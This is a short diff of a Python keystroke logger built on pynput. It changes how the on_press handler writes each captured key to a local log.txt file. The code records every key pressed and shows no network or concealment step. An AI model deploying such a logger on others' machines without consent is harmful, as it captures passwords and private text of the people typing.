@@ -2,10 +2,10 @@ from pynput.keyboard import Key, Listener
 
 def on_press(key):
     file = open('log.txt','a')
-    file.write('{0} pressed'.format(
+    file.write('{0}'.format(
         key))
     file.close()
-    #   
+    #
 
 
 
